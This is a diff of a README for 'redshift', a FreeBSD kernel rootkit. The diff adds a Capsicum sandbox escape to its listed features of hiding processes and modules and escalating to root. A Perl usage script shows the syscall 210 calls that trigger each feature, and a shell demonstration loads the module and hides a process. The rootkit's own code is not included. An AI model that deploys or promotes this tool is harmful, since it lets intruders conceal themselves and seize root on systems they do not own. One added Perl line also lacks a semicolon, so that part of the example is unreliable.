@@ -1,12 +1,14 @@
-This is a small rootkit for FreeBSD 10 AMD64. Initially, it was just a POC for a rootkit I've written to test some stuff in MSR (Model Specific Registers) a long time ago but now I have added more two features in it. Now it can be used to hide a module or process and escalate the privileges to root. There's an easy way to know if this rootkit is already on the system, you just need to load the module again and the kernel will tell you if the file already exists or not.
+redshift - FreeBSD rootkit
 
-It has been tested on FreeBSD 10.0-RELEASE AMD64.
+This is a small rootkit for FreeBSD AMD64. It has been tested on FreeBSD 10.0-RELEASE AMD64.
 
 Features:
 
 	Hide a process
 	Hide a module
 	Escalate the privileges to root
+	Escape the Capsicum sandbox
+
 
 Demonstration:
 
@@ -15,7 +17,6 @@ $ su
 Password:
 root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko
 root@rootkit:/usr/home/andersonc0d3 # exit
-exit
 $ cd rootkit_amd64
 $ cat hideme.c
 int main(void){
@@ -41,10 +42,11 @@ use warnings;
 
 my $a="rk";
 my $b="./hideme";
+my $capsicum_process_pid="999"
 
-# syscall(210,1)  # hook the interrupt handler
+# syscall(210,1)  # call the syscall to hook the interrupt handler
 #
-# syscall (210,0) # remove the hook from interrupt handler
+# syscall (210,0) # call the syscall to restore the original interrupt handler
 #
 # call syscall to hide a module
 #
@@ -54,7 +56,14 @@ syscall(210,3,$a);
 # call syscall to hide a process
 #
 #
+
 syscall(210,4,$b);
+
+# call syscall to escape a PID XYZ to Capsicum sandbox
+#
+#
+
+syscall(210,5,NULL,$capsicum_process_pid);
 $ perl exec.pl
 $ ps -p 985
 PID TT  STAT TIME COMMAND
